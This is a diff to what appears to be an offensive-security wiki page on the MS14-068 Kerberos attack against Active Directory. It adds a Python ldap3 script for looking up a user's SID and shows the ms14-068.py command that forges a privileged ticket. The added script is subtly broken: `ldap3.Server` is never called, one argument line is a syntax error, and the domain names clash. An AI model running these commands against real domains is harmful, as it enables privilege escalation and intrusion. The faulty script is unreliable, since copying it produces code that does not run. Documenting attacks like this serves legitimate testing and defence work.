@@ -148,6 +148,24 @@ This attack can be operated with [pykek](https://github.com/mubix/pykek)'s [ms14
 
 Referring to [kekeo](https://github.com/gentilkiwi/kekeo/wiki/ms14068)'s wiki might also help untangle some situations but errors like  `KDC_ERR_SUMTYPE_NOSUPP (15)` or `KRB_ERR_GENERIC (60)` when trying to use the generated `.ccache` ticket mean the target is patched.
 
+In order to operate the attack, knowing a domain account’s name, it’s password and it’s SID are needed. The SID can be obtained with the following script.
+
+```python
+import ldap3
+
+target_dn = "DC=domain,DC=local"
+domain = "domain.com"
+username = "username"
+password = "password"
+
+user = "{}\\{}".format(domain, username)
+server = ldap3.Server
+connection = ldap3.Connection(server=server, user=user, password=password, authentication authentication=ldap3.NTLM)
+connection.bind()
+connection.search(target_dn, "(samaccountname={})".format(username), attributes=["objectsid"])
+print(connection.entries)
+```
+
 ```bash
 # with a plaintext password
 ms14-068.py -u 'USER'@'DOMAIN_FQDN' -p 'PASSWORD' -s 'USER_SID' -d 'DOMAIN_CONTROLLER'
